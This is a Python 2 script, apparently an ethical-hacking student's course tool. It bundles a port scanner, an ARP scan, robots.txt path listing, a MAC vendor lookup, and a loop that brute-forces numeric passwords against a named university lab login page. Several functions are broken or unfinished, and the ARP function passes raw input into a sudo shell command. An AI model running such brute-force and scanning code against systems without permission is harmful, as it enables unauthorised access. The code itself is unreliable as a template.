import socket
import urllib2
import subprocess
import robotparser
import os

host = " "
port = " "

def returnMenu():
    reply = raw_input("Do you want to go back to the Menu? [y/n]: ")

    if reply == "N":
        raise SystemExit
    elif reply == "Y":
        amazingMenu()
    elif reply == "n":
        raise SystemExit
    elif reply == "y":
        amazingMenu()
    return
    
def scanport(host, port):
    """Attempt to connect to a port on a host to see if it is open
    :param host: Host IP to scan
    :param port: Port to scan
    """
    host = raw_input("Enter the IP you would like to scan: ")
    port = input("and which port would you like to scan? ")
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((host, port))
        print s.getsockname()
    except socket.error:
        s.close()
        return "Port "+str(port)+" is closed."
    s.close()
    return "Port "+str(port)+" is open!"

def multiPort(host, port):
    """Attempt to connect to a port on a host to see if it is open
    :param host: Host IP to scan
    :param port: Port to scan
    """
    host = raw_input("Enter the IP you would like to scan: ")
    port = 0
    s = socket.socket()
    s.settimeout(5)
    for port in range(0, 65535)
    try:
        s.connect((host, port))
        print s.getsockname()
    except socket.error:
        s.close()
        return "Port "+str(port)+" is closed."
    s.close()
    return "Port "+str(port)+" is open!"
    
def arp(host):
    """use arp-scan to attempt to get the mac address from an IP address"""
    """will only work on linux with arp-scan installed, to intall please use "sudo apt-get install arp-scan" thanks!"""
    
    host = raw_input("Enter the IP you would like to scan: ")
    arpScan = os.system("sudo arp-scan "+str(host))
    print arpScan
    

def crackHouse():
    """Bruteforce the password for titanium house"""

    for passw in range(1000):
        response = urllib2.urlopen("http://creative.coventry.ac.uk/eh/web_ch4/welcome.php?username=JoeSmith&password=%s" % passw)
        html = response.read()
        wordd = "incorrect"
        if wordd in html:
            print "Fails on {0}".format(passw)
        else:
            print "Passcode is {0}".format(passw)
            break
    return passw
    

#This needs a bit more tweaking to get it working:

def listRestricted():
    """ Return the restricted folders from a webpage based on the robots.txt file. """
    sites = ['www.google.com','www.coventry.ac.uk', 'www.yahoo.com']

    def getDenies(site):
        """ Create a new robotparser instance and read the site's robots file"""
        paths = []
        robot = robotparser.RobotFileParser()
        robot.set_url("http://"+site+"/robots.txt")
        robot.read()
        #robot.parse()

        robotic = robot.default_entry
        f = open("robots.txt", "w")
        f.write(str(robotic))
        f.close()
        #For each entry, look at the rule lines and add the path to paths if disallowed.
        
        fx = open("robots.txt", "r")
        for line in fx:
            if deny in line: print line
        fx.close()

        return set(paths)

    for site in  sites:
        print "Denies for " +site
        getDenies(site)
        
def identifyOUI():
    macaddress = raw_input("Search MAC address: ")
    #"""This function should identify the manufacturer of a given device based on its MAC adress"""
    # Load the Wireshark manufacturers database file from the disk and  search through it to return the manufacturer
    
    database = open("data.txt", "r")
    for line in database:
        if macaddress in line: print line
    database.close()
    identifyOUI()
    
    
    """This function should take all the output from the selected tunctionality and save it to a file of some sort."""
    
    #listRestricted()
    #print scanport("127.0.0.1",8000)
    #print crackhouse()
    #print listrestricted
    print("Documentation generated and saved to file.")
    
# Below I can test all the custom functionality that I am writing, just by calling the function

#if __name__ == "__main__":
    #amazingMenu()
    #listRestricted()
    #identifyOUI("A4:18:75")
    #print scanport("127.0.0.1",8000)
    #print crackhouse()
    #print listrestricted

def amazingMenu():
    """ Display an amazing Banner and the Menu for the tool to instantly impress the users."""
    print (30 * '-')
    print ("   M A I N - M E N U")
    print (30 * '-')
    print ("1. scanport")
    print ("2. crackHouse")
    print ("3. listRestricted")
    print ("4. identifyOUI")
    print ("5. generateReport")
    print ("6. arpScan")
    print ("7. Exit program")
    print (30 * '-')

    choice = input('Enter your choice [1-7] : ')

    choice = int(choice)
    if choice == 1:
        print ("Starting scanport...")
        print scanport(host, port)
        returnMenu()
    elif choice == 2:
        print ("Starting crackHouse...")
        crackHouse()
        returnMenu()
    elif choice == 3:
        print ("Starting listRestricted...")
        listRestricted()
        returnMenu()
    elif choice == 4:
        print ("Starting indentifyOUI...")
        identifyOUI()
        returnMenu()
    elif choice == 5:
        print ("Starting generateReport...")
        generateReport()
        returnMenu()
    elif choice == 6:
        print ("Starting arpScan...")
        arp(host)
        returnMenu()
    elif choice == 7:
        raise SystemExit
    else:
        print ("Invalid number. Try again...")

amazingMenu()


